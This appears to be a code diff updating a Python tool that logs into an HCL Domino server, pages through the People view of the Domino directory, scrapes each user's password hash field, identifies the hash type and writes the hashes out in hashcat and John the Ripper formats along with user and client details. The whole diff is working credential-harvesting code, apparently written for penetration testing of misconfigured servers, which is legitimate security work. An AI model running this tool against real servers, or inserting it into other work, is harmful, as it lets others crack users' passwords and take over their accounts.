@@ -26,7 +26,7 @@
 #
 # INSTALLATION
 # you may need to install these libaries for a local python3 installation:
-# pip3 install request
+# pip3 install requests
 # pip3 install beautifulsoup4
 
 import argparse
@@ -34,12 +34,21 @@ import csv
 import getpass
 import re
 import sys
-from bs4 import BeautifulSoup
-import requests
+from contextlib import ExitStack
 
-requests.packages.urllib3.disable_warnings()
+import requests
+import urllib3
+from bs4 import BeautifulSoup
+
+urllib3.disable_warnings()
+
+END_OF_VIEW_MARKERS = (
+    'Keine Dokumente gefunden',
+    'No Document found',
+)
+
 parser = argparse.ArgumentParser(description='HCL Domino password hash extraction tool')
-VERSION = '3.0'
+VERSION = '3.1'
 parser.add_argument('--version', action='version', version=VERSION)
 parser.add_argument('system', help="IP address or hostname. ")
 parser.add_argument('-n', '--username', metavar='username')
@@ -57,7 +66,6 @@ if len(sys.argv) == 1:
 
 args = parser.parse_args()
 
-# Check if the required argument is provided
 if not getattr(args, 'system', None):
     parser.error('The "system" argument is required.')
     sys.exit(1)
@@ -67,7 +75,29 @@ if not getattr(args, 'username', None):
     sys.exit(1)
 
 
-print("\nHCL Domino Hash Extration Tool {}\n".format(VERSION))
+def get_input_value(soup, field_name, default=''):
+    element = soup.find('input', {'name': field_name})
+    if element is None:
+        return default
+    value = element.get('value')
+    return value.strip() if value else default
+
+
+def detect_algorithm(hash_value):
+    if re.match(r"^[a-f0-9]{32}$", hash_value):
+        return 'Domino 5'
+    if re.match(r"^\([A-Za-z0-9+/]{20}\)$", hash_value):
+        return 'Domino 6'
+    if re.match(r"^\([A-Za-z0-9+/]{49}\)$", hash_value):
+        return 'Domino 8 or later'
+    return 'Hash algorithm not detected'
+
+
+def view_exhausted(response_text):
+    return any(marker in response_text for marker in END_OF_VIEW_MARKERS)
+
+
+print("\nHCL Domino Hash Extraction Tool {}\n".format(VERSION))
 print("\n")
 print("HCL Domino is a very secure platform by default.")
 print("However, configuration mistakes can lead to insecure installations.")
@@ -87,161 +117,141 @@ headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3926.54 Safari/537.36'
 }
 
-postData = {'Password': password, 'Username': args.username, 'RedirectTo': '/names.nsf/People?OpenView'}
+redirect_to = "{}/People?OpenView".format(args.uri.rstrip('/'))
+postData = {'Password': password, 'Username': args.username, 'RedirectTo': redirect_to}
 
 with requests.Session() as s:
     try:
         response = s.post("https://{}{}?Login".format(args.system, args.uri), verify=False, headers=headers,
                           timeout=3, data=postData)
-        response.raise_for_status()  # Raise an HTTPError for bad responses (4xx or 5xx)
+        response.raise_for_status()
     except requests.exceptions.RequestException as e:
-                print("Request error:", e)
-                sys.exit(1)
-                # Handle other types of request errors here if needed
-    else:
-        if response.status_code == 200:  # Check if the request was successful
-            soup = BeautifulSoup(response.text, 'html.parser')
-        else:
-            raise SystemExit("Unexpected HTTP status code: {}".format(response.status_code))
+        print("Request error:", e)
+        sys.exit(1)
 
-    print ("Authentication successful. HTTP status code 200 after login. Username and password seem to be correct.")
-    hashes = {}
-    start = 1
-    
+    if response.status_code != 200:
+        raise SystemExit("Unexpected HTTP status code: {}".format(response.status_code))
+
+    print("Authentication successful. HTTP status code 200 after login. Username and password seem to be correct.")
+
     filepath = args.file or args.system + ".txt"
-    file = open(filepath, 'w')
     algorithm = "not detected"
-    if args.csv:
-        csvfilepath = args.csv or args.system + ".csv"
-        csvFile = open(csvfilepath, 'w')
-        fieldnames = ['name', 'hash', 'algorithm', 'email', 'ClntMachine', 'ClntPltfrm', 'ClntBld',
-                      'HTTPPasswordChangeDate']
-        csvWriter = csv.DictWriter(csvFile, fieldnames=fieldnames, dialect='excel')
-        csvWriter.writeheader()
+    user_count = 0
+    start = 1
 
-    # adjust as needed
-    max_iterations = 2
-    i = 0
-    while i < max_iterations:
-        try:
-            response = s.get("https://{}{}/People?OpenView&Start={}".format(args.system, args.uri, start),
-                         verify=False, headers=headers, timeout=3)
-            response.raise_for_status()  # Raise an HTTPError for bad responses (4xx or 5xx)
-        except requests.exceptions.Timeout as e:
-            print("[!] Timed out after 3 seconds. Try again if this is a temporary problem.")
-            print("URL used: https://{}{}/People?OpenView&Start={}".format(args.system, args.uri, start))
-            sys.exit(1)
-        except requests.exceptions.RequestException as e:
-            print("Request error:", e)
-            sys.exit(1)
-            # Handle other types of request errors here if needed
-        else:
-            if response.status_code == 200:  # Check if the request was successful
-                soup = BeautifulSoup(response.text, 'html.parser')
-            else:
-                raise SystemExit("Unexpected HTTP status code: {}".format(response.status_code))
+    with ExitStack() as stack:
+        outfile = stack.enter_context(open(filepath, 'w'))
+        csvWriter = None
+        csvfilepath = None
+        if args.csv:
+            csvfilepath = args.csv or args.system + ".csv"
+            csvfile = stack.enter_context(open(csvfilepath, 'w', newline=''))
+            fieldnames = ['name', 'hash', 'algorithm', 'email', 'ClntMachine', 'ClntPltfrm', 'ClntBld',
+                          'HTTPPasswordChangeDate']
+            csvWriter = csv.DictWriter(csvfile, fieldnames=fieldnames, dialect='excel')
+            csvWriter.writeheader()
 
-        print("Success reading the first page of users from the Domino Directory. HTTP status code is 200")
-        soup = BeautifulSoup(response.text, 'html.parser')
-
-        start = start + 30
-        # will need an update with other versions or languages of HCL Domino
-        if 'Keine Dokumente gefunden' in response.text:
-            print("keine Dokumente gefunden")
-            break
-        if 'No Document found' in response.text:
-            print("No Document found")
-            break
-
-        links = []
-        print("Success, there seem to be user documents in the view.")
-        # grab all user profile links
-        for link in soup.findAll('a'):
-            if "OpenDocument" in link['href']:
-                if link['href'] not in links:
-                    links.append(link['href'])
-
-        for link in links:  # get user document
+        while True:
             try:
-                response = s.get("https://{}{}".format(args.system, link), verify=False, headers=headers, timeout=3)
-                response.raise_for_status()  # Raise an HTTPError for bad responses (4xx or 5xx)
-            except requests.exceptions.Timeout as e:
-                print("Timeout error:", e)
+                response = s.get("https://{}{}/People?OpenView&Start={}".format(args.system, args.uri, start),
+                                 verify=False, headers=headers, timeout=3)
+                response.raise_for_status()
+            except requests.exceptions.Timeout:
+                print("[!] Timed out after 3 seconds. Try again if this is a temporary problem.")
+                print("URL used: https://{}{}/People?OpenView&Start={}".format(args.system, args.uri, start))
+                sys.exit(1)
             except requests.exceptions.RequestException as e:
                 print("Request error:", e)
-                # Handle other types of request errors here if needed
-            else:
-                if response.status_code == 200:  # Check if the request was successful
-                    soup = BeautifulSoup(response.text, 'html.parser')
-                else:
+                sys.exit(1)
+
+            if response.status_code != 200:
+                raise SystemExit("Unexpected HTTP status code: {}".format(response.status_code))
+
+            print("Success reading users from the Domino Directory (Start={}). HTTP status code is 200".format(start))
+
+            if view_exhausted(response.text):
+                for marker in END_OF_VIEW_MARKERS:
+                    if marker in response.text:
+                        print(marker)
+                        break
+                break
+
+            soup = BeautifulSoup(response.text, 'html.parser')
+            links = []
+            for link in soup.find_all('a', href=True):
+                href = link['href']
+                if "OpenDocument" in href and href not in links:
+                    links.append(href)
+
+            if not links:
+                print("No user document links found on this page; stopping pagination.")
+                break
+
+            print("Success, there seem to be user documents in the view.")
+
+            for link in links:
+                try:
+                    response = s.get("https://{}{}".format(args.system, link), verify=False, headers=headers, timeout=3)
+                    response.raise_for_status()
+                except requests.exceptions.Timeout as e:
+                    print("Timeout error:", e)
+                    continue
+                except requests.exceptions.RequestException as e:
+                    print("Request error:", e)
+                    continue
+
+                if response.status_code != 200:
                     print("Unexpected HTTP status code:", response.status_code)
+                    continue
 
-                name = soup.find('input', {'name': 'InternetAddress'}).get('value').strip()# InternetAddress
+                soup = BeautifulSoup(response.text, 'html.parser')
+
+                name = get_input_value(soup, 'InternetAddress')
                 if not name:
-                    name = soup.find('input', {'name': 'DisplayName'}).get('value').strip()#     # If InternetAddress is empty use DisplayName instead.
-                httppassword_input = soup.find('input', {"name": "dspHTTPPassword"})
-                if httppassword_input:
-                    httppassword = httppassword_input.get('value').strip()
+                    name = get_input_value(soup, 'DisplayName')
+
+                httppassword = get_input_value(soup, 'dspHTTPPassword')
+                dsphttppassword = get_input_value(soup, 'PasswordDigest')
+
+                email = get_input_value(soup, 'InternetAddress')
+                ClntMachine = get_input_value(soup, 'ClntMachine')
+                ClntBld = get_input_value(soup, 'ClntBld')
+                ClntPltfrm = get_input_value(soup, 'ClntPltfrm')
+                HTTPPasswordChangeDate = get_input_value(soup, 'HTTPPasswordChangeDate')
+
+                hash_value = httppassword or dsphttppassword
+                user_count += 1
+
+                if not hash_value:
+                    print('No password hash found for user:', name)
+                    continue
+
+                algorithm = detect_algorithm(hash_value)
+                print("Algorithm:", algorithm)
+                if csvWriter:
+                    csvWriter.writerow({
+                        'name': name,
+                        'hash': hash_value,
+                        'algorithm': algorithm,
+                        'email': email,
+                        'ClntMachine': ClntMachine,
+                        'ClntPltfrm': ClntPltfrm,
+                        'ClntBld': ClntBld,
+                        'HTTPPasswordChangeDate': HTTPPasswordChangeDate,
+                    })
+
+                print((str(user_count) + " " + name + " : " + hash_value))
+                if args.hashcat or args.john:
+                    if args.hashcat:
+                        outfile.write(hash_value + "\n")
+                    if args.john:
+                        outfile.write("{}:{}\n".format(name, hash_value))
                 else:
-                    httppassword = ""
+                    outfile.write("[*] User: {} Hash: {}\n".format(name, hash_value))
 
-                dsphttppassword_input = soup.find('input', {"name": "PasswordDigest"})
-                if dsphttppassword_input:
-                    dsphttppassword = dsphttppassword_input.get('value').strip()
-                else:
-                    dsphttppassword = ""
+            start += 30
 
-                email = soup.find('input', {"name": "InternetAddress"}).get('value').strip()
-                ClntMachine = soup.find('input', {"name": "ClntMachine"}).get('value').strip()
-                ClntBld = soup.find('input', {"name": "ClntBld"}).get('value').strip()
-                ClntPltfrm = soup.find('input', {"name": "ClntPltfrm"}).get('value').strip()
-                HTTPPasswordChangeDate = soup.find('input', {"name": "HTTPPasswordChangeDate"}).get('value').strip()
-
-                hash_value = ""
-                if httppassword:
-                    hash_value = httppassword
-                elif dsphttppassword:
-                    hash_value = dsphttppassword # If httppassword is empty but dsphttppassword is set, use dsphttppassword
-                else:
-                    print('No password hash found for user:',name)
-
-                # Increment the iteration count
-                i += 1
-
-                if hash_value:
-                    # Match regex to determine hash algorithm
-                    if re.match(r"^[a-f0-9]{32}$", hash_value):
-                        algorithm = 'Domino 5'
-                    elif re.match(r"^\([A-Za-z0-9+/]{20}\)$", hash_value):
-                        algorithm = 'Domino 6'
-                    elif re.match(r"^\([A-Za-z0-9+/]{49}\)$", hash_value):
-                        algorithm = 'Domino 8 or later'
-                    else:
-                        algorithm = 'Hash algorithm not detected'
-                    print("Algorithm:", algorithm)
-                    if args.csv:
-                        csvWriter.writerow(
-                        {'name': name,
-                         'hash': hash_value,
-                         'algorithm': algorithm,
-                         'email': email,
-                         'ClntMachine': ClntMachine,
-                         'ClntPltfrm': ClntPltfrm,
-                         'ClntBld': ClntBld,
-                         'HTTPPasswordChangeDate': HTTPPasswordChangeDate})
-
-                    print((str(i) + " " + name + " : " + hash_value))
-                    if args.hashcat or args.john:
-                        if args.hashcat:
-                            file.write(hash_value + "\n")
-                        if args.john:
-                            file.write("{}:{}\n".format(name, hash_value))
-                    else:
-                        file.write("[*] User: {} Hash: {}".format(name, hash_value))
-
-    print()
-    if args.csv:
-        csvFile.close()
-        print(("extended account information written to " + csvfilepath))
-    file.close()
-    print(("hashes written to " + filepath + " with hashing algorithm: " + algorithm))  # I assume all users have the same hashing algorithm
+        print()
+        if csvfilepath:
+            print("extended account information written to " + csvfilepath)
+        print("hashes written to " + filepath + " with hashing algorithm: " + algorithm)
